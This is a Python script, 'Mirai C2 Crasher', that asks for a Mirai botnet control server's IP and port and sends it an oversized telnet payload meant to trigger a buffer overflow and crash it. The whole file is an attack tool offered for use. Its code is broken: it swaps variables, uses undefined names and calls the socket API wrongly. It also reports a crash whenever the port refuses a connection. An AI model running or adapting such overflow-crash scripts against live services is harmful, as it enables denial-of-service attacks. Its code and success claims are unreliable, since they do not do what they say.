# Project Name: Mirai C2 Crasher
# Project Author: VoidLSD
# Project Reason: Mirai C2 Crasher exploits a certain part of the code to cause buffer overflow.

import os
import time
import colorama
import telnetlib
import random
import socket
from colorama import Fore

intro = f"""
{Fore.RED}███╗   ███╗ ██████╗ █████╗
{Fore.GREEN}████╗ ████║██╔════╝██╔════╝
{Fore.RED}██╔████╔██║██║     ██
{Fore.GREEN}██║╚██╔╝██║██║     ██
{Fore.RED}██║ ╚═╝ ██║╚██████╗╚█████╗
{Fore.GREEN}╚═╝     ╚═╝ ╚═════╝ ╚═════╝
{Fore.RED}    Mirai C2 Crasher
{Fore.GREEN}   Created By VoidLSD
"""
os.system("clear")
print(intro)

c2ip = input(("C2 IP: "))
c2ip = str(c2ip)
c2port = input(("C2 Port: "))
c2ip = int(c2port)
payload = "void"+"d"*9999
timeout = 3
somesock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    with telnetlib.Telnet(host, port, timeout) as session:
        session.write("{}".format(payload).encode('utf-8'))
        session.write("{}".format(payload).encode('utf-8'))
        print("Payload sent!")
except Exception:
    try:
        result = somesock.connect_ex(c2ip, c2port)
        if result == 0:
            print("the C2 could not be crashed sucessfully.")
        else:
            print("The C2 was crashed successfully.")
    except:
        print("Could not connect, are you sure you put in the IP and port correctly?")
